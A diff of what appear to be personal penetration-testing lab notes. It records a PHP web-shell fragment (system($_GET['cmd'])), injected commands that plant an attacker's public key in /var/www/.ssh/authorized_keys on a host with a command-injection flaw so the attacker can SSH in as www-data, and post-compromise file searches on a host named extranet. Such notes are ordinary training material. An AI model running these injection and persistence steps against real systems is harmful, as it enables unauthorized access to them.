@@ -219,8 +219,8 @@ system($_GET['cmd'])'
       (On linops)-  ssh-keygen -t rsa -b 4096
       no passphrase
   (from remote host with cmdinjection vulnurabilty)- ;mkdir /var/www/.ssh [makes the directory to write too in the home of the user you are exploiting]
-                                                      ;ls - la /var/www 
-                                       (on linops)    ;cat /home/studetn/.ssh/id_rsa.pub   
+                                                      ; cd /var/www ;ls - la /var/www 
+                                       (on linops)    cat /home/student/.ssh/id_rsa.pub   
                              (back on remote host)    ;echo "" >> /var/www/.ssh/authorized_keys
                                                       ;cat /var/www/.ssh/authorized_keys
                                        (on linops)    ;ssh -i .ssh/id_rsa -p <port connected to remote> www-data@<ip>
@@ -556,6 +556,11 @@ s.close() ###STEP 1
 ~                   
 
 
+find / -iname *inven* 2>/dev/null
 
 
+/usr/src/linux-headers-4.15.0-88/include/linux/platform_data/invensense_mpu6050.h
+/usr/share/doc/gawk/examples/data/inventory-shipped
+/usr/share/equip-inventory.txt
+www-data@extranet:/home/comrade/Dekstop/network$ cd /usr/share
 ------------------------------------
